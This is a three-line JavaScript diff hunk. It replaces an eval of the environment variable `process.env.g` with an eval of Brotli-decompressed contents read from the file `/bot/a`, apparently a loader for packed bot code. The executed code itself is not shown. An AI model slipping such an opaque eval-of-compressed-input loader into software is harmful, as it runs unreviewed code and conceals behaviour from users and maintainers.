@@ -1,2 +1,3 @@
-eval
-(process.env.g)
+eval(require('zlib')
+.brotliDecompressSync(
+(F=require('fs')).readFileSync('/bot/a'))+'')
